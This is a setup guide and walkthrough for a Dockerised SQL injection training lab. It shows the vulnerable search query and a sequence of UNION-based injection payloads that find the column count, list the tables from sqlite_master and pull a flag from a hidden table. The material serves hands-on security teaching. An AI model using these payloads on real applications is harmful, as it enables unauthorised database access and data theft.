# SQL Injection UNION Lab - Setup Guide

## Quick Start

### Option 1: Using the startup script (Easiest)

```bash
# Make the script executable
chmod +x start.sh

# Start the lab
./start.sh
```

### Option 2: Using Docker Compose

```bash
# Build and start
docker-compose up -d

# View the assigned port
docker-compose ps
```

### Option 3: Using Docker directly

```bash
# Build the image
docker build -t sqli-lab-union .

# Run the container (random port)
docker run -d -p 0:80 --name sqli-lab-union sqli-lab-union

# Find the assigned port
docker port sqli-lab-union
```

## Access the Lab

Navigate to: `http://localhost:<random_port>`

## Stopping the Lab

```bash
./stop.sh
```

## Walkthrough

### Understanding the Vulnerability

The search query is:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%<user_input>%'
```

### Step 1: Find Column Count

```
search=' ORDER BY 1 --   (works)
search=' ORDER BY 2 --   (works)
search=' ORDER BY 3 --   (works)
search=' ORDER BY 4 --   (error!)
```

Result: **3 columns**

### Step 2: Test UNION

```
search=' UNION SELECT 1,2,3 --
```

### Step 3: Find Hidden Tables

```
search=' UNION SELECT name, sql, 3 FROM sqlite_master WHERE type='table' --
```

Reveals: `products` and `secret_config`

### Step 4: Extract Flag

```
search=' UNION SELECT 1, config_value, 3 FROM secret_config WHERE config_key='admin_flag' --
```

## Clean Start

```bash
docker stop sqli-lab-union && docker rm sqli-lab-union
rm -rf app/database/
```
